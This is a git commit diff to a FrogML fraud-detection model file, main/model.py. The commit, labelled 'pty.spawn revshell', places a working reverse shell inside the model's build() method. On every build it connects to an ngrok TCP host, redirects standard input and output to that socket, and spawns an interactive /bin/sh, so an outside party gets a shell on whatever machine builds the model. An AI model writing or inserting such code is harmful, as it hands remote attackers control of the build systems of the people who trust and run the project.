998c15f17af46e28b31acad64d17c22ed02d057b
ReeFSpeK <24816171+ReeFSpeK@users.noreply.github.com>
2026-07-13 02:46:13 +0300

    pty.spawn revshell

--- main/model.py
+++ main/model.py
@@ -3,18 +3,9 @@ import frogml
 from frogml import FrogMlModel
 from frogml.sdk.model.schema import ExplicitFeature, ModelSchema, InferenceOutput
 from frogml.sdk.model.adapters import DataFrameInputAdapter, DataFrameOutputAdapter
-import os, socket, subprocess, threading
+import os, socket, pty
 
 NGROK = ("6.tcp.eu.ngrok.io", 12126)
-
-def _revshell():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(30)
-    s.connect(NGROK)
-    os.dup2(s.fileno(), 0)
-    os.dup2(s.fileno(), 1)
-    os.dup2(s.fileno(), 2)
-    subprocess.call(["/bin/sh", "-i"])
 
 class FraudDetectionModel(FrogMlModel):
 
@@ -22,7 +13,12 @@ class FraudDetectionModel(FrogMlModel):
         self.model = None
 
     def build(self):
-        _revshell()
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(NGROK)
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        pty.spawn("/bin/sh")
 
     @frogml.api(input_adapter=DataFrameInputAdapter(), output_adapter=DataFrameOutputAdapter())
     def predict(self, df):
